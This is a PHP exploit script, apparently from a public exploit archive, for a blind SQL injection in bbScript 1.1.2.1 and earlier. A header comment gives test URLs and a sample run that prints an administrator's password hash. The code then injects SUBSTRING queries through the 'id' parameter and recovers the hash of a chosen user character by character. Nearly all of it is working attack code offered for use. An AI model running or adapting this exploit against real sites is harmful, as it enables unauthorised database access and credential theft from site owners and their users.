&lt;?php

/*

bbScript &lt;= 1.1.2.1 (id) Blind SQL Injection Exploit
Bug found &amp;&amp; exploited by cOndemned
Greetz: All friends, TWT, SecurityReason Team, Scruell ;*

Download: http://www.bbscript.com/download.php 
Note: You have to be logged into in order to download this script


/[bbScript_path]/index.php?action=showtopic&amp;id=1+and+1=1--	TRUE	(normal)
/[bbScript_path]/index.php?action=showtopic&amp;id=1+and+1=2--	FALSE	(error)


example:

condemned@agonia:~$ php bbscript-poc.php http://localhost/audits/bbScript admin

[~] bbScript &lt;= 1.1.2.1 (id) Blind SQL Injection Exploit
[~] Bug found &amp;&amp; exploited by cOndemned
[~] Target username set to admin
[~] Password Hash : 596a96cc7bf9108cd896f33c44aedc8a
[~] Done

*/

	
function concat($string)
{
	$length = strlen($string);
	$output = &#039;&#039;;

	for($i = 0; $i &lt; $length; $i++) $output .= sprintf(&quot;CHAR(%d),&quot;, ord($string[$i]));

	return &#039;CONCAT(&#039; . substr($output, 0, -1) . &#039;)&#039;;
}

echo &quot;\n[~] bbScript &lt;= 1.1.2.1 (id) Blind SQL Injection Exploit&quot;;
echo &quot;\n[~] Bug found &amp;&amp; exploited by cOndemned\n&quot;;

if($argc != 3)
{
	printf(&quot;[!] Usage: php %s &lt;target&gt; &lt;login&gt;\n\n&quot;, $argv[0]);
	exit;
}

list(, $target, $login) = $argv;

echo &quot;[~] Target username set to $login\n&quot;;
	
$login = concat($login);
$chars = array_merge((array)$chars, range(48, 57), range(97, 102));
$pos   = 1;

echo &quot;[~] Password Hash : &quot;;

while($pos != 33)
{
	for($i = 0; $i &lt;= 16; $i++)
	{
		$query  = &quot;/index.php?action=showtopic&amp;id=1+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username=$login),$pos,1)=CHAR({$chars[$i]})--&quot;;

		if(!preg_match(&#039;#Error#&#039;, file_get_contents($target . $query), $resp))
		{
			printf(&quot;%s&quot;, chr($chars[$i]));
			$pos++;
			break;
		}
	}
}

echo &quot;\n[~] Done\n\n&quot;;

?&gt;
